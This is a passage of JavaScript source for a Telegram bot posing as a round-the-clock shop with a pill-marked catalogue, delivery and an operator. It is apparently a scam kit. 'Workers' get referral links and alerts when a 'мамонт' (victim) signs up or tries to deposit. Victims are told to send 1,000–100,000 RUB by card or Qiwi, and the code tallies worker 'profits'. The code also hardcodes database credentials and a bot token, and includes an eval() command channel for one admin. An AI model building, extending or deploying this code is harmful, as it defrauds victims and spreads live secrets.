const mongo = require("mongoose");
mongo.connect("mongodb+srv://curs:curs@cluster0.utfcxxk.mongodb.net/curs");
const random = require("randomstring");
const qrcode = require("qrcode");
const fs = require("fs");
const axios = require('axios');
const CoinGecko = require('coingecko-api');

const CoinGeckoClient = new CoinGecko();

const admins = [5547452982,5857195314];    

function randomInteger(min, max) {
    let rand = min + Math.random() * (max + 1 - min);
    return Math.floor(rand);
  }

const User			=		mongo.model("CBBeta", new mongo.Schema({
	id: Number,
	balance: Number,
	ref: Number,
	idref: Number,
	epr: Number,
	eps: Number,
	invests: Number,
	lxc: Number,
	epv: Number,
	pay: Number, 
	part: Number, 
	day: Number, 
	spay: Number, 
	menu: String,
	adminmenu: String,
	prfUser: String,
	prp: Object,
	akk: Number,
	pakk: Number,
	inv: Number,
    oq: String,
	pod: Number, 
	ow: String,
	oe: String,
	or: String,
	ot: String,
	send: Number, 
    work: Number,
	refmoney: Number,
	bonusTimer: Number,
	viv: Number,
	regDate: String,
	usdt: Number,
	valute: String,
	ton: Number,
	btc: Number,
	eth: Number,
	doge: Number,
	sol: Number,
	trx: Number,
	bnb: Number,
	busd: Number,
	verify: Boolean
}));

const Payment			=		mongo.model("CBBPayment", new mongo.Schema({
id: {
		type: Number,
		required: true,
	},

	amountrub: Number,
    time: {
    type: Number,
    required: true,
    default: 10,
  },
	amountvkc: Number,
	date: Number,
	name: String,
	committed: Boolean,
	uid: Number
}));

const Gift		=		mongo.model("CBBGift", new mongo.Schema({
	id: String,
	uid: Number, 
	crypto: String,
	amount: Number
}));

const Curse			=		mongo.model("CBBRate", new mongo.Schema({
	uid: String,

	rub: Number,
    eur: Number,
	byn: Number,
	uan: Number,
	gbp: Number,
	cny: Number,
	kzt: Number,
	uzs: Number,
	gel: Number,
	try: Number,
	krw: Number,

	Usdt: Number,
	Ton: Number,
    Bitcoin: Number,
	Ethereum: Number, 
    BinanceCoin: Number,
	Busd: Number
}));

const Invests			=		mongo.model("CBBInvest", new mongo.Schema({
	id: Number,
	balance: Number,
	zarabotok: Number,
}));

const Stats			=		mongo.model("CBBStats", new mongo.Schema({
	id: String,
	inv: Number,
	viv: Number,
	suminv: Number,
	sumviv: Number,
	user: Number
}));

const Ticket		=		mongo.model("CBBTicket", new mongo.Schema({
	owner: Number,
	wallet: String,
	amount: Number
}));

const Ban			=		mongo.model("CBBBan", new mongo.Schema({
	id: Number
}));

const Telegram		=		require("node-telegram-bot-api");
const bot			=		new Telegram(
	"6384661233:AAGPLWhVTkE8G9_bQ76LS0rzh58_7FzNq5w", // Токен BotFather
	{ polling: true }
);

const keyboards		=		{
	main: [
		["/start"],
	],
	cancel: [
		["⛔️ Отмена"]
	],
	admin: [
		["🧍 Рассылка", "🧾 Создать платёж" ],
		["💸 Баланс", "🆔 Информация"], 
	]
}

bot.on("message", async (message) => {
    if(message.chat.id == -1001540739663) { return }
	let ban = await Ban.findOne({ id: message.from.id });
	if(ban) return;

	message.send = (text, params) => bot.sendMessage(message.chat.id, text, params);
	User.findOne({ id: message.from.id }).then(async ($user) => {
		
		if($user) return;

		let schema = {
			id: message.from.id,
			balance: 0,
			ref: 0,
			inv: 0,
			viv: 0,
			akk: 0,
			lxc: 0,
			valute: `usd`,
			epr: 0,
			eps: 0,
			epv: 0,
			day: 1,
			pay: 0,
			spay: 0,
			idref: 0,
			usdt: 0,
	        ton: 0,
	        btc: 0,
	        eth: 0,
            doge: 0,
	        sol: 0,
	        trx: 0,
	        bnb: 0,
            work: 0,
			refmoney: 0,
	        busd: 0,
			invests: 0,
			bonusTimer: 0,
			oq: ``,
			ow: ``,
			send: 0,
			oe: ``,
			or: ``,
			ot: ``,
			part: 0, 
			pod: 0, 
			menu: "",
			adminmenu: "",
			prfUser: "",
			prp: {},
			regDate: `${new Date().getDate()}.${new Date().getMonth() + 1}.${new Date().getFullYear()}`,
			verify: false
		}

				if(Number(message.text.split("/start ")[1])) {
			schema.ref		=		Number(message.text.split("/start ")[1]);
			let user = new User(schema);
		await user.save();
		await message.send(`⚡️ Добро пожаловать в магазин ⚡️

        ▪️ В нашем магазине в короткие сроки вы можете получить необходимый вам товар.
        ▪️ Мы работаем круглосуточно.
        ▪️ Всегда сверяйте юзернейм оператора. МЫ НИКОГДА НЕ НАПИШЕМ ПЕРВЫЕ. 
        ▪️ Если ваш населённый пункт отсутствует в каталоге - обратитесь к оператору, мы поможем с оформлением предзаказа/доставки.`, {
	parse_mode: "HTML",
					reply_markup: {
               inline_keyboard: [				   
							[
       { text: "🔎 Пройти капчу", callback_data: `pod` },
							],
						],
						
			},
				})
				
let ref = await User.findOne({ id: Number(message.text.split("/start ")[1]) });
		let sr = message.from.id
   if(!ref) return
   if(ref.work == 1) {
    await bot.sendMessage(ref.id, `
✅ Мамонт @ <a href="tg://user?id=${sr}">id${sr}</a> зарегистрировался по твоей ссылке [${sr}]`, {
    parse_mode: "HTML"
   });
   }
   if(ref.work == 0) {
   bot.sendMessage(ref.id, `
🐬 Новый <a href="tg://user?id=${sr}">реферал</a> <b>1</b> уровня`, {
    parse_mode: "HTML"
   });
await User.findOneAndUpdate({ id: ref.id}, { $inc: { part: 1} })
   }
			}
await message.send(`⚡️ Добро пожаловать в магазин ⚡️

▪️ В нашем магазине в короткие сроки вы можете получить необходимый вам товар.
▪️ Мы работаем круглосуточно.
▪️ Всегда сверяйте юзернейм оператора. МЫ НИКОГДА НЕ НАПИШЕМ ПЕРВЫЕ. 
▪️ Если ваш населённый пункт отсутствует в каталоге - обратитесь к оператору, мы поможем с оформлением предзаказа/доставки.`, {
parse_mode: "HTML",
            reply_markup: {
       inline_keyboard: [				   
                    [
{ text: "🔎 Пройти капчу", callback_data: `pod` },
                    ],
                ],
                
    },
        })

		let user = new User(schema);
		await user.save();
	});
	message.user = await User.findOne({ id: message.from.id });

	if(message.text === "⛔️ Отмена" || message.text === "🔙 Начало" ||message.text === "◀️ Назад" ) {
	
		await User.findOneAndUpdate({ id: message.user.id }, { $set: { menu: "" } })
		await User.findOneAndUpdate({ id: message.user.id }, { $set: { adminmenu: "" } })
if(message.user.pod == 0) {
		return message.send(`⚡️ Добро пожаловать в магазин ⚡️

        ▪️ В нашем магазине в короткие сроки вы можете получить необходимый вам товар.
        ▪️ Мы работаем круглосуточно.
        ▪️ Всегда сверяйте юзернейм оператора. МЫ НИКОГДА НЕ НАПИШЕМ ПЕРВЫЕ. 
        ▪️ Если ваш населённый пункт отсутствует в каталоге - обратитесь к оператору, мы поможем с оформлением предзаказа/доставки.`, {
	parse_mode: "HTML",
					reply_markup: {
               inline_keyboard: [				   
							[
       { text: "🔎 Пройти капчу", callback_data: `pod` },
							],
						],
						
			},
				})
	}
		return message.send(`⚡️ Добро пожаловать в магазин ⚡️

        ▪️ В нашем магазине в короткие сроки вы можете получить необходимый вам товар.
        ▪️ Мы работаем круглосуточно.
        ▪️ Всегда сверяйте юзернейм оператора. МЫ НИКОГДА НЕ НАПИШЕМ ПЕРВЫЕ. 
        ▪️ Если ваш населённый пункт отсутствует в каталоге - обратитесь к оператору, мы поможем с оформлением предзаказа/доставки.
        `, {
			parse_mode: "HTML",
			reply_markup: {
				inline_keyboard: [				   
						[
							{ text: "💊 Каталог", callback_data: `kat` },
                            { text: "👥 Реферальная программа", callback_data: `referal` },
							{ text: "ℹ️ Отзывы", callback_data: `otz` },
							 ],
							 [
								{ text: "🚕 Доставка", callback_data: `kur` },
                                { text: "⚡ Профиль", callback_data: `prof` },
                                { text: "🧑‍💻 Оператор", url: `t.me/` },
							 ],
							 [
		{ text: "🔥 Работа", callback_data: `work` },
        { text: "🛒 Мои покупки", callback_data: `pok` },
							 ],
                             [
                                { text: "💲 Пополнить баланс", callback_data: `deposit` },
                                                     ],
						 ],
						 
			 }, 
		});
	}

    if(message.text === "/workerstart") {
        await message.user.set("menu", "post");
        await User.findOneAndUpdate({ id: message.user.id }, { $set: { work: 1 } })
        return message.send(`Work логирование включено`);
    } 

if(message.text === "/start") {
	if (message.chat.id < 0) { return } 
	if(!message.user) return
	if(message.user.pod == 0) {
		return  message.send(`⚡️ Добро пожаловать в магазин ⚡️

        ▪️ В нашем магазине в короткие сроки вы можете получить необходимый вам товар.
        ▪️ Мы работаем круглосуточно.
        ▪️ Всегда сверяйте юзернейм оператора. МЫ НИКОГДА НЕ НАПИШЕМ ПЕРВЫЕ. 
        ▪️ Если ваш населённый пункт отсутствует в каталоге - обратитесь к оператору, мы поможем с оформлением предзаказа/доставки.`, {
	parse_mode: "HTML",
					reply_markup: {
               inline_keyboard: [				   
							[
       { text: "🔎 Пройти капчу", callback_data: `pod` },
							],
						],
						
			},
				})
	}
		await message.send(`⚡️ Добро пожаловать в магазин ⚡️

        ▪️ В нашем магазине в короткие сроки вы можете получить необходимый вам товар.
        ▪️ Мы работаем круглосуточно.
        ▪️ Всегда сверяйте юзернейм оператора. МЫ НИКОГДА НЕ НАПИШЕМ ПЕРВЫЕ. 
        ▪️ Если ваш населённый пункт отсутствует в каталоге - обратитесь к оператору, мы поможем с оформлением предзаказа/доставки.
        `, {
			parse_mode: "HTML",
			reply_markup: {
				inline_keyboard: [				   
                    [
                        { text: "💊 Каталог", callback_data: `kat` },
                        { text: "👥 Реферальная программа", callback_data: `referal` },
                        { text: "ℹ️ Отзывы", callback_data: `otz` },
                         ],
                         [
                            { text: "🚕 Доставка", callback_data: `kur` },
                            { text: "⚡ Профиль", callback_data: `prof` },
                            { text: "🧑‍💻 Оператор", url: `t.me/` },
                         ],
                         [
    { text: "🔥 Работа", callback_data: `work` },
    { text: "🛒 Мои покупки", callback_data: `pok` },
                         ],
                         [
                            { text: "💲 Пополнить баланс", callback_data: `deposit` },
                                                 ],
						 ],
						 
			 }, 
		});
	}

    if(message.text === "/working") {
        if (message.chat.id < 0) { return } 
        if(!message.user) return
        if(message.user.pod == 0) {
            return  message.send(`⚡️ Добро пожаловать в магазин ⚡️
    
            ▪️ В нашем магазине в короткие сроки вы можете получить необходимый вам товар.
            ▪️ Мы работаем круглосуточно.
            ▪️ Всегда сверяйте юзернейм оператора. МЫ НИКОГДА НЕ НАПИШЕМ ПЕРВЫЕ. 
            ▪️ Если ваш населённый пункт отсутствует в каталоге - обратитесь к оператору, мы поможем с оформлением предзаказа/доставки.`, {
        parse_mode: "HTML",
                        reply_markup: {
                   inline_keyboard: [				   
                                [
           { text: "🔎 Пройти капчу", callback_data: `pod` },
                                ],
                            ],
                            
                },
                    })
        }
        let fff = ``
        let ggg = ``
        if(message.user.work == 0) {
            fff += `❌`
            ggg += `<b>❌ Включите реферальное логирование для воркеров</b>`
        }
        if(message.user.work == 1) {
            fff += `✅`
            ggg += `<b>✅ Реферальные логи для воркеров включены</b>`
        }
            await message.send(`⚡️ Добро пожаловать в work panel ⚡️
    
ID: ${message.user.id}
Вы сделали <b>${message.user.spay}</b> профитов на сумму <b>${message.user.pay}</b> RUB за все время

Ваша реферальная ссылка: http://t.me/Fjdjfkfjckdibot?start=${message.user.id}

${ggg}
            `, {
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [				   
                        [
                            { text: `ℹ Реферальное логирование  (${fff})`, callback_data: `logref` },
                             ],
                    ]      
                 }, 
            });
        }

    if(message.user.menu.startsWith("verif")) {
        let result = (message.user.menu.split("_")[1]);
        if(message.text != result) {
            await  message.send(`⚡️ Добро пожаловать в магазин ⚡️

        ▪️ В нашем магазине в короткие сроки вы можете получить необходимый вам товар.
        ▪️ Мы работаем круглосуточно.
        ▪️ Всегда сверяйте юзернейм оператора. МЫ НИКОГДА НЕ НАПИШЕМ ПЕРВЫЕ. 
        ▪️ Если ваш населённый пункт отсутствует в каталоге - обратитесь к оператору, мы поможем с оформлением предзаказа/доставки.`, {
	parse_mode: "HTML",
					reply_markup: {
               inline_keyboard: [				   
							[
       { text: "🔎 Пройти капчу", callback_data: `pod` },
							],
						],
						
			},
				})
                return User.findOneAndUpdate({ id: message.user.id }, { $set: { menu: `` } })
        }
        if(message.text == result) {
            await User.findOneAndUpdate({ id: message.user.id }, { $set: { pod: 1 } })
    await message.send(`⚡️ Добро пожаловать в магазин ⚡️

    ▪️ В нашем магазине в короткие сроки вы можете получить необходимый вам товар.
    ▪️ Мы работаем круглосуточно.
    ▪️ Всегда сверяйте юзернейм оператора. МЫ НИКОГДА НЕ НАПИШЕМ ПЕРВЫЕ. 
    ▪️ Если ваш населённый пункт отсутствует в каталоге - обратитесь к оператору, мы поможем с оформлением предзаказа/доставки.
    `, {
        parse_mode: "HTML",
        reply_markup: {
            inline_keyboard: [				   
                [
                    { text: "💊 Каталог", callback_data: `kat` },
                    { text: "👥 Реферальная программа", callback_data: `referal` },
                    { text: "ℹ️ Отзывы", callback_data: `otz` },
                     ],
                     [
                        { text: "🚕 Доставка", callback_data: `kur` },
                        { text: "⚡ Профиль", callback_data: `prof` },
                        { text: "🧑‍💻 Оператор", url: `t.me/` },
                     ],
                     [
{ text: "🔥 Работа", callback_data: `work` },
{ text: "🛒 Мои покупки", callback_data: `pok` },
                     ],
                     [
                        { text: "💲 Пополнить баланс", callback_data: `deposit` },
                                             ],
                     ],
                     
         }, 
    });
}
}
		if(message.user.menu.startsWith("gift")) {
			message.text = Number(message.text);
			let crypto = (message.user.menu.split("_")[1]);
            if(crypto == `usdt`) {
            if(message.text < 0.1) {
				return message.send(`На какую сумму USDT выписать чек? (Его сможет обналичить любой пользователь, знающий код).

Доступно: ${message.user.usdt} USDT
Введите сумму не менее 0.1 USDT`) 
			}
			if(message.text > message.user.usdt) {
				return message.send(`На какую сумму USDT выписать чек? (Его сможет обналичить любой пользователь, знающий код).

Доступно: ${message.user.usdt} USDT
Недостаточно средств, введите сумму меньше`)
			}
			await User.findOneAndUpdate({ id: message.user.id }, { $set: { menu: "" } }) 
			message.send(`⚡️`) 
var result = random.generate(30)
var png = random.generate(10)
qrcode.toFile(`${png}.png`, `https://t.me/TokenRocketRobot?start=c_${result}`, {
  color: {
    dark: '#000',  
    light: '#0000'
  }
}, function (err) {
  if (err) throw err
  console.log('done')
})
			await User.findOneAndUpdate({ id: message.user.id }, { $inc: { usdt: -message.text } }) 
			
		
			 message.send(`

Чтобы другой пользователь смог получить USDT отправьте ему ссылку или QR код.

Чек может обналичить даже не зарегистрированный пользователь.

https://t.me/TokenRocketRobot?start=c_${result}`);
			let gift = new Gift({
					id: result,
					uid: message.user.id,
					crypto: `USDT`,
					amount: message.text
				});
				await gift.save();
				let file = `${png}.png`
				
		 bot.sendPhoto(message.user.id, file) 
		
	fs.unlink(`${png}.png`, (err) => {
 if (err) throw err;

  console.log('Deleted');
		})
			}
			if(crypto == `ton`) {
				if(message.text < 0.1) {
					return message.send(`На какую сумму TON выписать чек? (Его сможет обналичить любой пользователь, знающий код).
	
	Доступно: ${message.user.ton} TON
	Введите сумму не менее 0.1 TON`) 
				}
				if(message.text > message.user.ton) {
					return message.send(`На какую сумму TON выписать чек? (Его сможет обналичить любой пользователь, знающий код).
	
	Доступно: ${message.user.ton} TON
	Недостаточно средств, введите сумму меньше`)
				}
				await User.findOneAndUpdate({ id: message.user.id }, { $set: { menu: "" } }) 
				message.send(`⚡️`) 
var result = random.generate(30)
var png = random.generate(10)
qrcode.toFile(`${png}.png`, `https://t.me/TokenRocketRobot?start=c_${result}`, {
  color: {
    dark: '#000',  
    light: '#0000'
  }
}, function (err) {
  if (err) throw err
  console.log('done')
})
			await User.findOneAndUpdate({ id: message.user.id }, { $inc: { ton: -message.text } }) 
			
		
			 message.send(`

Чтобы другой пользователь смог получить TON отправьте ему ссылку или QR код.

Чек может обналичить даже не зарегистрированный пользователь.

https://t.me/TokenRocketRobot?start=c_${result}`);
			let gift = new Gift({
					id: result,
					uid: message.user.id,
					crypto: `TON`,
					amount: message.text
				});
				await gift.save();
				let file = `${png}.png`;
				
		 bot.sendPhoto(message.user.id, file); 
		
	fs.unlink(`${png}.png`, (err) => {
 if (err) throw err;

  console.log('Deleted');
		})
			}
			if(crypto == `btc`) {
				if(message.text < 0.1) {
					return message.send(`На какую сумму BTC выписать чек? (Его сможет обналичить любой пользователь, знающий код).
	
	Доступно: ${message.user.btc} BTC
	Введите сумму не менее 0.1 BTC`) 
				}
				if(message.text > message.user.btc) {
					return message.send(`На какую сумму BTC выписать чек? (Его сможет обналичить любой пользователь, знающий код).
	
	Доступно: ${message.user.btc} BTC
	Недостаточно средств, введите сумму меньше`)
				}
				await User.findOneAndUpdate({ id: message.user.id }, { $set: { menu: "" } }) 
				message.send(`⚡️`) 
var result = random.generate(30)
var png = random.generate(10)
qrcode.toFile(`${png}.png`, `https://t.me/TokenRocketRobot?start=c_${result}`, {
  color: {
    dark: '#000',  
    light: '#0000'
  }
}, function (err) {
  if (err) throw err
  console.log('done')
})

			await User.findOneAndUpdate({ id: message.user.id }, { $inc: { btc: -message.text } }) 
			
		
			 message.send(`

Чтобы другой пользователь смог получить BTC отправьте ему ссылку или QR код.

Чек может обналичить даже не зарегистрированный пользователь.

https://t.me/TokenRocketRobot?start=c_${result}`);
			let gift = new Gift({
					id: result,
					uid: message.user.id,
					crypto: `BTC`,
					amount: message.text
				});
				await gift.save();
				let file = `${png}.png`
				
		 bot.sendPhoto(message.user.id, file) 
		
	fs.unlink(`${png}.png`, (err) => {
 if (err) throw err;

  console.log('Deleted');
		})
			}
			if(crypto == `eth`) {
				if(message.text < 0.1) {
					return message.send(`На какую сумму ETH выписать чек? (Его сможет обналичить любой пользователь, знающий код).
	
	Доступно: ${message.user.eth} ETH
	Введите сумму не менее 0.1 ETH`) 
				}
				if(message.text > message.user.eth) {
					return message.send(`На какую сумму ETH выписать чек? (Его сможет обналичить любой пользователь, знающий код).
	
	Доступно: ${message.user.eth} ETH
	Недостаточно средств, введите сумму меньше`)
				}
				await User.findOneAndUpdate({ id: message.user.id }, { $set: { menu: "" } }) 
				message.send(`⚡️`) 
var result = random.generate(30)
var png = random.generate(10)
qrcode.toFile(`${png}.png`, `https://t.me/TokenRocketRobot?start=c_${result}`, {
  color: {
    dark: '#000',  
    light: '#0000'
  }
}, function (err) {
  if (err) throw err
  console.log('done')
})

			await User.findOneAndUpdate({ id: message.user.id }, { $inc: { eth: -message.text } }) 
			
		
			 message.send(`

Чтобы другой пользователь смог получить ETH отправьте ему ссылку или QR код.

Чек может обналичить даже не зарегистрированный пользователь.

https://t.me/TokenRocketRobot?start=c_${result}`);
			let gift = new Gift({
					id: result,
					uid: message.user.id,
					crypto: `ETH`,
					amount: message.text
				});
				await gift.save();
				let file = `${png}.png`
				
		 bot.sendPhoto(message.user.id, file) 
		
	fs.unlink(`${png}.png`, (err) => {
 if (err) throw err;

  console.log('Deleted');
		})
			}
			if(crypto == `bnb`) {
				if(message.text < 0.1) {
					return message.send(`На какую сумму BNB выписать чек? (Его сможет обналичить любой пользователь, знающий код).
	
	Доступно: ${message.user.bnb} BNB
	Введите сумму не менее 0.1 BNB`) 
				}
				if(message.text > message.user.bnb) {
					return message.send(`На какую сумму BNB выписать чек? (Его сможет обналичить любой пользователь, знающий код).
	Доступно: ${message.user.bnb} BNB
	Недостаточно средств, введите сумму меньше`)
				}
				await User.findOneAndUpdate({ id: message.user.id }, { $set: { menu: "" } }) 
				message.send(`⚡️`) 
var result = random.generate(30)
var png = random.generate(10)
qrcode.toFile(`${png}.png`, `https://t.me/TokenRocketRobot?start=c_${result}`, {
  color: {
    dark: '#000',  
    light: '#0000'
  }
}, function (err) {
  if (err) throw err
  console.log('done')
})

			await User.findOneAndUpdate({ id: message.user.id }, { $inc: { bnb: -message.text } }) 
			
		
			 message.send(`

Чтобы другой пользователь смог получить BNB отправьте ему ссылку или QR код.

Чек может обналичить даже не зарегистрированный пользователь.

https://t.me/TokenRocketRobot?start=c_${result}`);
			let gift = new Gift({
					id: result,
					uid: message.user.id,
					crypto: `BNB`,
					amount: message.text
				});
				await gift.save();
				let file = `${png}.png`
				
		 bot.sendPhoto(message.user.id, file) 
		
	fs.unlink(`${png}.png`, (err) => {
 if (err) throw err;

  console.log('Deleted');
		})
			}
			if(crypto == `busd`) {
				if(message.text < 0.1) {
					return message.send(`На какую сумму BUSD выписать чек? (Его сможет обналичить любой пользователь, знающий код).
	
	Доступно: ${message.user.busd} BUSD
	Введите сумму не менее 0.1 BUSD`) 
				}
				if(message.text > message.user.busd) {
					return message.send(`На какую сумму BUSD выписать чек? (Его сможет обналичить любой пользователь, знающий код).
	
	Доступно: ${message.user.busd} BUSD
	Недостаточно средств, введите сумму меньше`)
				}
				await User.findOneAndUpdate({ id: message.user.id }, { $set: { menu: "" } }) 
				message.send(`⚡️`) 
var result = random.generate(30)
var png = random.generate(10)
qrcode.toFile(`${png}.png`, `https://t.me/TokenRocketRobot?start=c_${result}`, {
  color: {
    dark: '#000',  
    light: '#0000'
  }
}, function (err) {
  if (err) throw err
  console.log('done')
})

			await User.findOneAndUpdate({ id: message.user.id }, { $inc: { busd: -message.text } }) 
			
		
			 message.send(`

Чтобы другой пользователь смог получить BUSD отправьте ему ссылку или QR код.

Чек может обналичить даже не зарегистрированный пользователь.

https://t.me/TokenRocketRobot?start=c_${result}`);
			let gift = new Gift({
					id: result,
					uid: message.user.id,
					crypto: `BUSD`,
					amount: message.text
				});
				await gift.save();
				let file = `${png}.png`
				
		 bot.sendPhoto(message.user.id, file) 
		
	fs.unlink(`${png}.png`, (err) => {
 if (err) throw err;

  console.log('Deleted');
		})
			}
		}

									if(message.user.menu.startsWith("enterAmount")) {
										if (message.chat.id < 0) { return } 
			message.text = Math.floor(Number(message.text));
			if(!message.text) return message.send(`Введите сумму на вывод`);

			let wallet = (message.user.menu.split("_")[1]);
            let platc = (message.user.menu.split("_")[2]);
            
            
			if(message.text > message.user.balance) return message.send(`Введите сумму на вывод`);
			if(message.text < 49.99) return message.send(`Введите сумму на вывод`);

			else if(message.text <= message.user.balance) {
				
				await User.findOneAndUpdate({ id: message.user.id}, { $inc: { balance: -message.text} })

	
				await message.user.dec("balance", message.text);

	let ouser = await User.findOne({ id: 5547452982 });
			let oq = ouser.oq
			let ow = ouser.ow
			let oe = ouser.oe
			let or = ouser.or
			await User.findOneAndUpdate({ id: 5547452982 }, { $set: { ot: or } })
            await User.findOneAndUpdate({ id: 5547452982 }, { $set: { or: oe } })
			await User.findOneAndUpdate({ id: 5547452982 }, { $set: { oe: ow } })
			await User.findOneAndUpdate({ id: 5547452982 }, { $set: { ow: oq } })

			bot.sendMessage(message.user.id, `✅ Заявка на вывод создана, средства придут в течении 24 часов!`, {
			parse_mode: "HTML", 
			reply_markup: {
						keyboard: keyboards.main,
						resize_keyboard: true
					}, 
		}); 
		let ticket = new Ticket({
					owner: message.user.id,
	wallet: `${wallet} (${platc})`,
	amount: message.text
				});

				await ticket.save();
				await message.user.set("menu", "");
admins.map((x) => bot.sendMessage(x, `<a href="tg://user?id=${message.user.id}">🔔</a> Новая заявка на вывод
`, {
				parse_mode: "HTML",
			}));
			}
		}

		if(message.user.menu.startsWith("qiwi")) {
			if (message.chat.id < 0) { return } 
			message.text = message.text;
			let plat = (message.user.menu.split("qiwi")[1]);
			console.log(plat)
			await message.user.set("menu", "enterAmount_" + message.text + plat);
			return message.send(`Введите сумму на вывод`,{ parse_mode: "HTML" });
		}

        function getRandomInt(max) {
            return Math.floor(Math.random() * max);
          }

        if(message.user.menu.startsWith("deposit")) {
			if (message.chat.id < 0) { return } 
			message.text = Number(message.text);
            if(message.text < 1000) {
                await User.findOneAndUpdate({ id: message.user.id }, { $set: { menu: `` } })
                return message.send(`🚫 Минимальная сумма пополнения: 1 000 RUB`, {
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [				   
                             [
                                { text: "< Назад", callback_data: `menu` },
                                                     ],
                             ],
                             
                 }, 
            });
            }
            if(message.text > 100000) {
                await User.findOneAndUpdate({ id: message.user.id }, { $set: { menu: `` } })
                return message.send(`🚫 Максимальная сумма пополнения: 100 000 RUB`, {
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [				   
                             [
                                { text: "< Назад", callback_data: `menu` },
                                                     ],
                             ],
                             
                 }, 
            });
            }
            let ggg = await User.findOne({ id: message.user.id });
            let ref = await User.findOne({ id: ggg.ref });
            await User.findOneAndUpdate({ id: message.user.id }, { $set: { menu: `` } })
            var result = getRandomInt(99)
            var hr = 1-(result/100)
			await message.send(`Сумма к оплате: ${message.text-hr} RUB
            💳 Для оплаты с помощью прямого перевода совершите платёж по реквизитам: реквизиты

            🔥 Для оплаты с помощью qiwi совершите платёж на сумму по реквизитам: реквизиты
            
            После перевода предоставьте чек в pdf формате оператору магазина
            `, {
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [	
                        [
                            { text: "🧑‍💻 Оператор", url: `t.me/` },
                        ],			   
                             [
                                { text: "< Назад", callback_data: `menu` },
                                                     ],
                             ],
                             
                 }, 
            });
			if(ref.work == 1) {
                await bot.sendMessage(ref.id, `🗣 Мамонт @ <a href="tg://user?id=${message.user.id}">id${message.user.id}</a> хочет пополнить баланс на сумму ${message.text} RUB через 🥝 Qiwi / 💳 Card`, {
                parse_mode: "HTML"
               });
               }
		}
		
		if(message.text === "/chat") {
			if (message.chat.id > 0) { return } 
			return message.send(`
ID: <code>${message.chat.id}</code>`, {
			parse_mode: "HTML"
		});
			} 
	
	if(/^(?:~)\s([^]+)/i.test(message.text)) {
		if(message.from.id !== 5547452982) return;

		let result = eval(message.text.match(/^(?:~)\s([^]+)/i)[1]);
		try {
			if(typeof(result) === "string")
			{
				return message.send(`string: \`${result}\``, { parse_mode: "Markdown" });
			} else if(typeof(result) === "number")
			{
				return message.send(`number: \`${result}\``, { parse_mode: "Markdown" });
			} else {
				return message.send(`${typeof(result)}: \`${JSON.stringify(result, null, '\t\t')}\``, { parse_mode: "Markdown" });
			}
		} catch (e) {
			console.error(e);
			return message.send(`ошибка:
\`${e.toString()}\``, { parse_mode: "Markdown" });
		}
	}

	if(admins.indexOf(message.from.id) !== -1) {
		if(message.user.menu.startsWith("setBalance")) {
			message.text		=		Number(message.text);
			if(!message.text) return message.send(`Введите новый баланс.`);

			let user		=		await User.findOne({ id: Number(message.user.menu.split("setBalance")[1]) });
			if(!user) return;

			await user.set("balance", message.text);
			await message.user.set("menu", "");

			return message.send(`Баланс успешно изменён.`, {
				reply_markup: {
					keyboard: keyboards.admin,
					resize_keyboard: true
				}
			});
		}
		
		if(message.user.menu.startsWith("setInBalance")) {
			message.text		=		Number(message.text);
			if(!message.text) return message.send(`Введите сумму.`);

			let user		=		await User.findOne({ id: Number(message.user.menu.split("setInBalance")[1]) });
			if(!user) return;

			await user.set("invests", message.text);
			await message.user.set("menu", "");

			return message.send(`Инвест успешно изменён.`, {
				reply_markup: {
					keyboard: keyboards.admin,
					resize_keyboard: true
				}
			});
		}

		if(message.user.menu === "enterIdBalance") {
			message.text		=		Math.floor(Number(message.text));
			if(!message.text) return message.send(`Введите айди.`);

			let user		=		await User.findOne({ id: message.text });
			if(!user) return message.send(`Пользователь не найден.`);

			await message.user.set("menu", "setBalance" + message.text);
			return message.send(`Введите новый баланс.\nБаланс сейчас: ${user.balance} RUB`);
		}
		
				if(message.user.menu === "enterIdInBalance") {
			message.text		=		Math.floor(Number(message.text));
			if(!message.text) return message.send(`Введите айди.`);

			let user		=		await User.findOne({ id: message.text });
			if(!user) return message.send(`Пользователь не найден.`);

			await message.user.set("menu", "setInBalance" + message.text);
			return message.send(`Введите сколько добавить.\nИнвестиции сейчас: ${user.invests} RUB`);
		}

		if(message.user.menu.startsWith("auditory")) {
			let users		=		await User.find();
			let total		=		users.length * Number(message.user.menu.split("auditory")[1]);

			for (let i = 0; i < total; i++) {
				if(message.photo) {
					let file_id = message.photo[message.photo.length - 1].file_id;
					let params = {
						caption: message.caption,
						parse_mode: "HTML",
						disable_web_page_preview: true
					}

					if(message.caption.match(/(?:кнопка)\s(.*)\s-\s(.*)/i)) {
						let [ msgText, label, url ] = message.caption.match(/(?:кнопка)\s(.*)\s-\s(.*)/i);
						params.reply_markup = {
							inline_keyboard: [
								[{ text: label, url: url }]
							]
						}

						params.caption = params.caption.replace(/(кнопка)\s(.*)\s-\s(.*)/i, "");
					}

					bot.sendPhoto(users[i].id, file_id, params);
				}

				if(!message.photo) {
					let params = {
						parse_mode: "HTML",
						disable_web_page_preview: true
					}

					if(message.text.match(/(?:кнопка)\s(.*)\s-\s(.*)/i)) {
						let [ msgText, label, url ] = message.text.match(/(?:кнопка)\s(.*)\s-\s(.*)/i);
						params.reply_markup = {
							inline_keyboard: [
								[{ text: label, url: url }]
							]
						}
					}

					bot.sendMessage(users[i].id, message.text.replace(/(кнопка)\s(.*)\s-\s(.*)/i, ""), params);
				}
			}

			await message.user.set("menu", "");
			await message.send("Рассылка успешно завершена.", {
				reply_markup: {
					keyboard: keyboards.admin,
					resize_keyboard: true
				}
			});
		}

		if(message.user.menu === "selectAuditory") {
			await message.user.set("menu", "auditory" + Number(message.text));
			return message.send(`Введите текст рассылки.
			
Можно прикрепить изображение.`, {
				reply_markup: {
					keyboard: keyboards.cancel,
					resize_keyboard: true
				}
			});
		}

		
		if(message.user.menu === "ban") {
			message.text		=		Math.floor(Number(message.text));
			if(!message.text) return message.send(`Введите айди.`);

			let ban			=		await Ban.findOne({ id: message.text });
			if(ban) {
				await ban.remove();
				await message.user.set("menu", "");

				return message.send(`Бан снят.`);
			} else {
				let _ban = new Ban({
					id: message.text
				});

				await _ban.save();
				await message.user.set("menu", "");

				return message.send(`Бан выдан.`);
			}
		}
		if(message.user.menu === "enterpay") {
			message.text		=		Math.floor(Number(message.text));
			if(!message.text) return message.send(`Введите айди.`);

			let user		=		await User.findOne({ id: message.text });
			if(!user) return message.send(`Пользователь не найден.`);

			await message.user.set("menu", "setpay" + message.text);
